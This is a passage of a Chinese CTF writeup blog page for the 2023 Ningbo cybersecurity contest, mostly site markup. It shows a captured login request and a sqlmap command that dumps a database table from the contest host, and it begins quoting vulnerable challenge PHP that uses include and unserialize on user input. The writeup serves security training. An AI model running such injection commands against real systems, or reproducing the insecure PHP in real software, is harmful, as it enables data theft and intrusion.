@@ -1,0 +1,588 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.9.1"><title>天一永安杯宁波市网络安全大赛 2023 Writeup</title><meta name="title" content="天一永安杯宁波市网络安全大赛 2023 Writeup"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/nb-infosec-2023/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/nb-infosec-2023/"><meta property="og:title" content="天一永安杯宁波市网络安全大赛 2023 Writeup"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/nb-infosec-2023/"><meta property="twitter:title" content="天一永安杯宁波市网络安全大赛 2023 Writeup"><meta property="twitter:description" content><!-- 暗色模式初始化脚本 --><script>
+	// 防止暗色模式闪烁
+	(function() {
+		const theme = localStorage.getItem('theme');
+		const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+		
+		if (theme === 'dark' || (!theme && systemPrefersDark)) {
+			document.documentElement.classList.add('dark');
+		} else {
+			document.documentElement.classList.remove('dark');
+		}
+	})();
+</script><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.nrRQ818r.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.BwKSd7l3.css">
+<style>.toc[data-astro-cid-woz2nwfv]{position:fixed;top:12rem;right:6rem;width:260px;max-height:calc(100vh - 16rem);overflow-y:auto;padding:1.5rem;font-size:.9375rem;line-height:1.5;z-index:100}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar{width:4px}.toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#0003;border-radius:2px}.dark[data-astro-cid-woz2nwfv] .toc[data-astro-cid-woz2nwfv]::-webkit-scrollbar-thumb{background:#ffffff4d}@media (max-width: 1280px){.toc[data-astro-cid-woz2nwfv]{position:static;width:100%;max-height:none;margin:2rem 0}}.toc-title[data-astro-cid-woz2nwfv]{font-size:1rem;font-weight:600;margin:0 0 1rem}.toc-list[data-astro-cid-woz2nwfv],.toc-sublist[data-astro-cid-woz2nwfv]{list-style:none;padding:0;margin:0}.toc-sublist[data-astro-cid-woz2nwfv]{padding-left:1.25rem;margin:.25rem 0}.toc-link[data-astro-cid-woz2nwfv]{display:block;text-decoration:none;padding:.375rem .5rem;margin:.125rem 0;border-radius:.5rem;font-weight:400}.toc-link[data-astro-cid-woz2nwfv].active{font-weight:500;background:#3b82f61a!important;color:#3b82f6!important}.dark[data-astro-cid-woz2nwfv] .toc-link[data-astro-cid-woz2nwfv].active{background:#60a5fa33!important;color:#60a5fa!important}.lightbox[data-astro-cid-vqtgpguw]{position:fixed;inset:0;z-index:500;display:flex;align-items:center;justify-content:center;animation:fade-in .3s;backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);background:#3037424d;overflow:hidden;padding:20px;box-sizing:border-box}.lightbox[data-astro-cid-vqtgpguw].exit{animation:fade-out .3s}@keyframes fade-in{0%{opacity:0}}@keyframes fade-out{to{opacity:0}}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:80vw!important;max-height:75vh!important;width:auto!important;height:auto!important;-o-object-fit:contain!important;object-fit:contain!important;border-radius:3px;cursor:zoom-out;display:block!important;margin:0 auto;opacity:0;transition:opacity .3s ease}.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw].show{opacity:1}.lightbox[data-astro-cid-vqtgpguw] .toolbar[data-astro-cid-vqtgpguw]{position:absolute;bottom:5%;left:1rem;right:1rem;display:flex;justify-content:space-between;align-items:center;color:#fff;max-width:600px;-webkit-backdrop-filter:blur(10px);backdrop-filter:blur(10px);margin:0 auto;padding:10px;border-radius:5px;background:#0000001a;z-index:1}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]{width:32px;height:32px;display:flex;justify-content:center;align-items:center;cursor:pointer;border-radius:3px;background:#fff3;transition:all .2s}.lightbox[data-astro-cid-vqtgpguw] .btn[data-astro-cid-vqtgpguw]:hover{background:#ffffff80}.lightbox[data-astro-cid-vqtgpguw] .counter[data-astro-cid-vqtgpguw]{width:60px;display:flex;align-items:center;justify-content:center;font-size:14px}.lightbox[data-astro-cid-vqtgpguw] .nav[data-astro-cid-vqtgpguw]{display:flex;gap:10px}@media (max-width: 768px){.lightbox[data-astro-cid-vqtgpguw] img[data-astro-cid-vqtgpguw]{max-width:75vw!important;max-height:65vh!important}}
+</style></head> <body class="bg-white dark:bg-gray-900 transition-colors duration-300"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <!-- 桌面端主题切换按钮 --> <div class="absolute right-4 top-1/2 transform -translate-y-1/2 hidden md:block" data-astro-cid-3ef6ksr2> <button class="theme-toggle p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+	// 立即执行，同步设置图标状态
+	(function() {
+		// 获取系统主题偏好
+		function getSystemTheme() {
+			return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+		}
+		
+		// 应用主题
+		function applyTheme(theme) {
+			if (theme === 'dark') {
+				document.documentElement.classList.add('dark');
+			} else {
+				document.documentElement.classList.remove('dark');
+			}
+			setIconsState();
+		}
+		
+		// 获取当前应该使用的主题
+		function getCurrentTheme() {
+			const savedTheme = localStorage.getItem('theme');
+			
+			// 如果用户没有手动设置过，跟随系统设置
+			if (!savedTheme) {
+				return getSystemTheme();
+			}
+			
+			// 如果用户设置为 'auto'，也跟随系统设置
+			if (savedTheme === 'auto') {
+				return getSystemTheme();
+			}
+			
+			// 否则使用用户设置的主题
+			return savedTheme;
+		}
+		
+		// 设置图标状态
+		function setIconsState() {
+			const isDark = document.documentElement.classList.contains('dark');
+			const sunIcons = document.querySelectorAll('.sun-icon');
+			const moonIcons = document.querySelectorAll('.moon-icon');
+			
+			sunIcons.forEach(icon => {
+				icon.style.display = isDark ? 'none' : 'block';
+			});
+			
+			moonIcons.forEach(icon => {
+				icon.style.display = isDark ? 'block' : 'none';
+			});
+		}
+		
+		// 初始化主题
+		function initTheme() {
+			const theme = getCurrentTheme();
+			applyTheme(theme);
+		}
+		
+		// 立即初始化主题
+		initTheme();
+		
+		// 监听系统主题变化
+		window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function(e) {
+			const savedTheme = localStorage.getItem('theme');
+			// 只有在用户没有手动设置或设置为 auto 时才跟随系统变化
+			if (!savedTheme || savedTheme === 'auto') {
+				applyTheme(e.matches ? 'dark' : 'light');
+			}
+		});
+		
+		// 绑定点击事件
+		function bindEvents() {
+			const buttons = document.querySelectorAll('.theme-toggle:not([data-ready])');
+			
+			buttons.forEach(button => {
+				button.addEventListener('click', function() {
+					const isDark = document.documentElement.classList.contains('dark');
+					const newTheme = isDark ? 'light' : 'dark';
+					
+					// 用户手动切换时，保存具体的主题设置
+					localStorage.setItem('theme', newTheme);
+					applyTheme(newTheme);
+				});
+				
+				button.setAttribute('data-ready', 'true');
+			});
+		}
+		
+		// 如果DOM已加载，立即绑定事件
+		if (document.readyState !== 'loading') {
+			bindEvents();
+		} else {
+			document.addEventListener('DOMContentLoaded', bindEvents);
+		}
+		
+		// 监听页面导航
+		document.addEventListener('astro:page-load', function() {
+			initTheme();
+			bindEvents();
+		});
+	})();
+</script>  </div> <!-- 移动端控件 --> <div class="md:hidden flex items-center justify-between w-full" data-astro-cid-3ef6ksr2> <button id="menu-btn" class="flex flex-col space-y-1 p-2 text-black dark:text-white" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <button class="theme-toggle p-3 rounded-full hover:bg-gray-100 dark:hover:bg-gray-800 transition-colors duration-200" aria-label="切换暗色模式" title="切换暗色模式" data-astro-cid-x3pjskd3> <svg class="sun-icon w-5 h-5 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" data-astro-cid-x3pjskd3></path> </svg> <svg class="moon-icon w-5 h-5 text-gray-600 dark:text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24" data-astro-cid-x3pjskd3> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" data-astro-cid-x3pjskd3></path> </svg> </button> <script>
+	// 立即执行，同步设置图标状态
+	(function() {
+		// 获取系统主题偏好
+		function getSystemTheme() {
+			return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+		}
+		
+		// 应用主题
+		function applyTheme(theme) {
+			if (theme === 'dark') {
+				document.documentElement.classList.add('dark');
+			} else {
+				document.documentElement.classList.remove('dark');
+			}
+			setIconsState();
+		}
+		
+		// 获取当前应该使用的主题
+		function getCurrentTheme() {
+			const savedTheme = localStorage.getItem('theme');
+			
+			// 如果用户没有手动设置过，跟随系统设置
+			if (!savedTheme) {
+				return getSystemTheme();
+			}
+			
+			// 如果用户设置为 'auto'，也跟随系统设置
+			if (savedTheme === 'auto') {
+				return getSystemTheme();
+			}
+			
+			// 否则使用用户设置的主题
+			return savedTheme;
+		}
+		
+		// 设置图标状态
+		function setIconsState() {
+			const isDark = document.documentElement.classList.contains('dark');
+			const sunIcons = document.querySelectorAll('.sun-icon');
+			const moonIcons = document.querySelectorAll('.moon-icon');
+			
+			sunIcons.forEach(icon => {
+				icon.style.display = isDark ? 'none' : 'block';
+			});
+			
+			moonIcons.forEach(icon => {
+				icon.style.display = isDark ? 'block' : 'none';
+			});
+		}
+		
+		// 初始化主题
+		function initTheme() {
+			const theme = getCurrentTheme();
+			applyTheme(theme);
+		}
+		
+		// 立即初始化主题
+		initTheme();
+		
+		// 监听系统主题变化
+		window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', function(e) {
+			const savedTheme = localStorage.getItem('theme');
+			// 只有在用户没有手动设置或设置为 auto 时才跟随系统变化
+			if (!savedTheme || savedTheme === 'auto') {
+				applyTheme(e.matches ? 'dark' : 'light');
+			}
+		});
+		
+		// 绑定点击事件
+		function bindEvents() {
+			const buttons = document.querySelectorAll('.theme-toggle:not([data-ready])');
+			
+			buttons.forEach(button => {
+				button.addEventListener('click', function() {
+					const isDark = document.documentElement.classList.contains('dark');
+					const newTheme = isDark ? 'light' : 'dark';
+					
+					// 用户手动切换时，保存具体的主题设置
+					localStorage.setItem('theme', newTheme);
+					applyTheme(newTheme);
+				});
+				
+				button.setAttribute('data-ready', 'true');
+			});
+		}
+		
+		// 如果DOM已加载，立即绑定事件
+		if (document.readyState !== 'loading') {
+			bindEvents();
+		} else {
+			document.addEventListener('DOMContentLoaded', bindEvents);
+		}
+		
+		// 监听页面导航
+		document.addEventListener('astro:page-load', function() {
+			initTheme();
+			bindEvents();
+		});
+	})();
+</script>  </div> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white dark:bg-gray-800 rounded-xl shadow-2xl border border-gray-100 dark:border-gray-700 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),a=document.getElementById("menu");e?.addEventListener("click",()=>{const t=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"打开菜单":"关闭菜单"),a?.classList.toggle("hidden"),e.classList.toggle("open")});e?.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())});document.addEventListener("keydown",t=>{t.key==="Escape"&&!a?.classList.contains("hidden")&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"),e?.focus())});document.addEventListener("click",t=>{!e?.contains(t.target)&&!a?.contains(t.target)&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"))});</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 dark:text-white mb-6 tracking-tight leading-tight"> 天一永安杯宁波市网络安全大赛 2023 Writeup </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-05-22T08:59:56.000Z" class="text-[#86868b] dark:text-gray-400 tracking-wide"> <time datetime="2023-05-22T08:59:56.000Z"> May 22, 2023 </time> </time>  <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] dark:text-gray-400 tracking-wide" aria-label="阅读时间 7 min read">7 min read</span>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] dark:text-gray-500 flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/CTF.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 CTF 下的所有文章"> CTF </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/Writeup.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 Writeup 下的所有文章"> Writeup </a> <span class="text-[#d2d2d7] dark:text-gray-500" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] dark:text-gray-400 hover:text-[#0066cc] dark:hover:text-blue-400 transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc transition-colors duration-300" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title text-gray-900 dark:text-white" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#web" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1. Web </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#query" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.1. Query </a> </li><li data-astro-cid-woz2nwfv> <a href="#deserialization" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.2. Deserialization </a> </li><li data-astro-cid-woz2nwfv> <a href="#codecheck" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 1.3. CodeCheck </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#misc" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2. Misc </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#zip" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.1. zip </a> </li><li data-astro-cid-woz2nwfv> <a href="#simpledocument" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.2. SimpleDocument </a> </li><li data-astro-cid-woz2nwfv> <a href="#beautifulimage" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.3. BeautifulImage </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#mobile" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3. Mobile </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#peacock" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.1. peacock </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#crypto" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4. Crypto </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#secret" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.1. secret </a> </li><li data-astro-cid-woz2nwfv> <a href="#morse的笔记本" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.2. Morse的笔记本 </a> </li><li data-astro-cid-woz2nwfv> <a href="#rsa" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.3. rsa </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <p>因为线下不报差旅，简单划划水<s>(绝对不是因为打不进线下！😫)</s></p>
+<!--more-->
+<h2 id="web">Web</h2>
+<h3 id="query">Query</h3>
+<blockquote>
+<p>Query suitable data and get your flag.</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line" data-line="1"><span style="color:#F97583">POST</span><span style="color:#E1E4E8"> http://37a6852ac4faf290.node.nsctf.cn/login.php </span><span style="color:#F97583">HTTP</span><span style="color:#E1E4E8">/</span><span style="color:#79B8FF">1.1</span></span>
+<span class="line" data-line="2"><span style="color:#85E89D">Host</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 37a6852ac4faf290.node.nsctf.cn</span></span>
+<span class="line" data-line="3"><span style="color:#85E89D">Content-Length</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 21</span></span>
+<span class="line" data-line="4"><span style="color:#85E89D">Cache-Control</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> max-age=0</span></span>
+<span class="line" data-line="5"><span style="color:#85E89D">Upgrade-Insecure-Requests</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> 1</span></span>
+<span class="line" data-line="6"><span style="color:#85E89D">Origin</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> http://37a6852ac4faf290.node.nsctf.cn</span></span>
+<span class="line" data-line="7"><span style="color:#85E89D">Content-Type</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> application/x-www-form-urlencoded</span></span>
+<span class="line" data-line="8"><span style="color:#85E89D">User-Agent</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36</span></span>
+<span class="line" data-line="9"><span style="color:#85E89D">Accept</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span>
+<span class="line" data-line="10"><span style="color:#85E89D">Referer</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> http://37a6852ac4faf290.node.nsctf.cn/login.php</span></span>
+<span class="line" data-line="11"><span style="color:#85E89D">Accept-Encoding</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> gzip, deflate</span></span>
+<span class="line" data-line="12"><span style="color:#85E89D">Accept-Language</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> zh-CN,zh;q=0.9</span></span>
+<span class="line" data-line="13"><span style="color:#85E89D">Cookie</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> PHPSESSID=8lvsj65t588pem3sqkj1m24md6</span></span>
+<span class="line" data-line="14"><span style="color:#85E89D">Connection</span><span style="color:#F97583">:</span><span style="color:#9ECBFF"> close</span></span>
+<span class="line" data-line="15"></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">username=1&#x26;password=*</span></span></code></pre>
+<p>直接使用 sqlmap 一把梭即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>python .\sqlmap.py -r post.txt -D 'ctf' -T 'f111' --dump</span></span></code></pre>
+<h3 id="deserialization">Deserialization</h3>
+<blockquote>
+<p>Construct your object</p>
+</blockquote>
+<p>访问环境查看源代码发现代码片段，要求传递 <code>$read</code> 和 <code>$input</code>，其中 <code>$read</code> 不能包含 <code>fl4g</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line" data-line="1"><span style="color:#6A737D">&#x3C;!--</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">//The location of the flag is at route.php</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D">$read = $_POST["read"];</span></span>
+<span class="line" data-line="4"><span style="color:#6A737D">$input = $_POST["input"];</span></span>
+<span class="line" data-line="5"><span style="color:#6A737D">if(!isset($read) or !isset($input))</span></span>
+<span class="line" data-line="6"><span style="color:#6A737D">{</span></span>
+<span class="line" data-line="7"><span style="color:#6A737D">die("NONONO!");</span></span>
+<span class="line" data-line="8"><span style="color:#6A737D">}</span></span>
+<span class="line" data-line="9"><span style="color:#6A737D">if(strpos($read, "f14g")===FALSE)</span></span>
+<span class="line" data-line="10"><span style="color:#6A737D">{</span></span>
+<span class="line" data-line="11"><span style="color:#6A737D">include($read);</span></span>
+<span class="line" data-line="12"><span style="color:#6A737D">$input = unserialize($input);</span></span>
+<span class="line" data-line="13"><span style="color:#6A737D">$input2 = clone $input;</span></span>
+<span class="line" data-line="14"><span style="color:#6A737D">$input2->position = "route.php";</span></span>
